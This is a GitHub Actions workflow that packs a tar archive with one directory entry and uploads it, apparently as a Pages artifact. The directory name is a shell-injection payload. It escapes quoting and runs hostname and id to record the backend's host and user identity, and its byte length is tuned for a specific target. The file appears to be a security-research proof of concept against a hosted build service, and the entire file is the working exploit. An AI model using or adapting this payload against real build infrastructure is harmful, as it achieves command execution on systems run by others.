name: Pages bounded backend identity canary

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: Create one-directory identity canary tar
        run: |
          python3 - <<'PY'
          import tarfile

          directory = 'x\';f(){ /bin/hostname>"$5/h";/usr/bin/id -un>"$5/u";echo "$3">"$5/pages-build-version";};f \''
          assert len(directory.encode()) == 92
          header = tarfile.TarInfo(directory)
          header.type = tarfile.DIRTYPE
          header.mode = 0o755
          with tarfile.open('pages-identity-canary.tar', 'w', format=tarfile.USTAR_FORMAT) as archive:
              archive.addfile(header)
          with tarfile.open('pages-identity-canary.tar') as archive:
              members = archive.getmembers()
          assert len(members) == 1 and members[0].isdir()
          PY

      - name: Upload without ZIP wrapping
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          path: pages-identity-canary.tar
          archive: false
          retention-days: 1
